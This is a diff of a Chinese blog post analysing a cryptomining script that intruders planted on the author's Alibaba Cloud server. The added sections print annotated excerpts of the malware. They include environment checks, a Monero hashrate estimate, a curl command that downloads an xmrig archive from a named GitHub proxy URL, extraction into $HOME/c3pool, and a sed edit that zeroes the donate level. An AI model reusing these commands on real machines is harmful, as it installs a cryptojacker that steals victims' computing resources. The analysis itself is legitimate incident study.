@@ -1,6 +1,6 @@
 # 记上次黑客入侵阿里云主机，并分析其代码行为。
 
-已将问题反馈到阿里云安全团队客服，并向阿里云中心举报其地址。接下来是代码分析。
+已将问题反馈到阿里云安全团队客服，并向阿里云中心举报其地址。接下来是代码分析。(中)
 
 ## xz.sh部分，即卸载脚本
 
@@ -76,6 +76,8 @@ sleep 88;rm -rf cd /root/c3pool
 
 ### if语句检测环境内容
 
+#### 第一层 if
+
 参考信息源：
 
 * [百度知道-Linux shell 脚本 $(id -u) 是什么意思？](https://zhidao.baidu.com/question/944658594109817212.html)
@@ -84,6 +86,7 @@ sleep 88;rm -rf cd /root/c3pool
 * [Shell中的exit 0 和 exit 1是做什么的?](https://www.pianshen.com/article/37962128580/)
 * [博客园-shell中的type命令](https://www.cnblogs.com/chaoguo1234/p/5723531.html)
 * [Linux /dev/null详解](https://www.shuzhiduo.com/A/6pdDP9ALdw/)
+
 
 ```
 #-----
@@ -107,7 +110,7 @@ if [ ! -d $HOME ]; then
   exit 1
 fi
 
-# 找不到curl命令定义，则丢入黑洞。
+# 找不到curl命令定义，则丢入黑洞，跳出
 if ! type curl >/dev/null; then
   echo "ERROR: This script requires \"curl\" utility to work correctly"
   exit 1
@@ -119,7 +122,61 @@ fi
 #    echo "ERROR: This script requires systemd to work correctly"
 #    exit 1
 #  fi
+# 看起来是调用（CPU几个核心数*7/10），如果为0，跳出。
+CPU_THREADS=$(nproc)
+EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
+if [ -z $EXP_MONERO_HASHRATE ]; then
+  echo "ERROR: Can't compute projected Monero CN hashrate"
+  exit 1
+fi
 ```
+
+以上这echo所打印的报错信息，基本也说明主机不能正常使用，这对他们黑客而言，已经没有任何价值了。如果这些正常的话，则运行下载好的挖矿脚本，以及其专用的挖矿程序。然后又是层层的if环境检验。
+
+#### 第二层 if
+
+参考信息源：
+
+* [入门小站-linux之curl命令](https://zhuanlan.zhihu.com/p/519406107)
+* [sed -i 命令入门详解](https://blog.csdn.net/h4241778/article/details/125263518)
+* [XMR恶意挖矿案例简析](https://www.sohu.com/a/260504074_354899)
+* [诱捕黑客的蜜罐系统](https://baijiahao.baidu.com/s?id=1706341262655959831)
+* [linux应用之test命令详细解析](https://www.cnblogs.com/tankblog/p/6160808.html)
+
+
+```
+# curl -L --progress-bar 显示网页内容与进度条，存在异常则直接中断退出。
+if ! curl -L --progress-bar "https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
+  echo "ERROR: Can't download https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
+  echo ""
+  exit 1
+fi
+
+#  不能正常解压缩，退出删除文件
+if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool --strip=1; then
+    echo ""
+	echo ""
+  fi
+  rm /tmp/xmrig.tar.gz
+
+# 使用正则，看上去是为了替换掉原有的config.json的donate-level的数值。
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/c3pool/config.json
+  $HOME/c3pool/xmrig --help >/dev/null
+  # $? 最后命令的退出状态的返回值。0表示没有错误，其他任何值表明有错误。
+  #   # 比较，不等于0，再检验下xmrig还是不是文件，是就打印换行，否则跳出。
+  if (test $? -ne 0); then 
+    if [ -f $HOME/c3pool/xmrig ]; then
+      echo ""
+	  echo ""
+    else 
+      echo ""
+	  echo ""
+    fi
+    exit 1
+  fi
+fi
+```
+
 
 ### echo信息
 
